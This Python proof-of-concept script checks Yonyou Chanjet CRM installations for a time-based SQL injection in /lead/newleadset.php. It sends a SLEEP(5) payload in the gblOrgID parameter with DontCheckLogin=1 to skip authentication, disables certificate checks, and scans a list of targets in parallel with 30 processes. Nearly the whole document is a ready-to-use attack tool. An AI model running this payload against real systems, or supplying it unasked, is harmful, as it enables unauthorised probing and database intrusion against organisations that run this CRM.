import time
from multiprocessing import Pool
import requests
import argparse
import urllib.parse
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser("用友畅捷通CRM-newleadset.phpSQL延时注入---POC")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url!')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file!')
    args = parser.parse_args()
    pool = Pool(30)

    if args.url:
        target = format_url(args.url)
        time_sql_test(target)
    elif args.file:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for line in f.readlines():
                    line = line.strip()
                    target = format_url(line)
                    targets.append(target)
            pool.map(time_sql_test, targets)
            pool.close()
            pool.join()  # 添加join，确保进程池任务执行完毕并正确释放资源
        except FileNotFoundError:
            print(f"文件 {args.file} 不存在，请检查路径是否正确")
        except PermissionError:
            print(f"没有权限打开文件 {args.file}")
        except Exception as e:
            print(f"读取文件出现其他异常: {e}")

def time_sql_test(url):

    first_url = url

    url = url+'/lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1'

    headers = {
        'User - Agent': 'Mozilla / 5.0(Windows NT 10.0;Win64;x64;rv: 128.0) Gecko / 20100101Firefox / 128.0',
        'Connection': 'close',
        'Accept': 'text / html, application / xhtml + xml, application / xml;q = 0.9, image / avif, image / webp, image / png, image / svg + xml, * / *;q = 0.8',
        'Accept - Encoding': 'gzip, deflate',
        'Accept - Language': 'zh - CN, zh;q = 0.8, zh - TW;q = 0.7, zh - HK;q = 0.5, en - US;q = 0.3, en;q = 0.2'
    }

    start_time = time.time()

    try:
        response = requests.get(url,headers=headers,timeout=10, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[-]请求失败：{first_url}")
        return False

    end_time = time.time()
    response_time = end_time - start_time
    # 输出响应时间
    # print(f"响应时间: {response_time:.2f}秒")

    # 如果响应时间大于预设阈值（例如 4 秒），则认为可能存在 SQL 延时注入
    if response_time > 5:
        print(f"[*]潜在的 SQL 延时注入漏洞：{first_url}")
        return True
    else:
        print(f"[-]没有发现漏洞：{first_url}")
        return False

def format_url(url):
    # 去除 URL 首尾的空白字符
    url = url.strip()
    """格式化URL，补充协议头，添加路径，确保URL格式规范"""
    if url.endswith('/'):
        url = url[:-1]
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme:
        return 'http://'+url
    return url

if __name__ == '__main__':
    main()



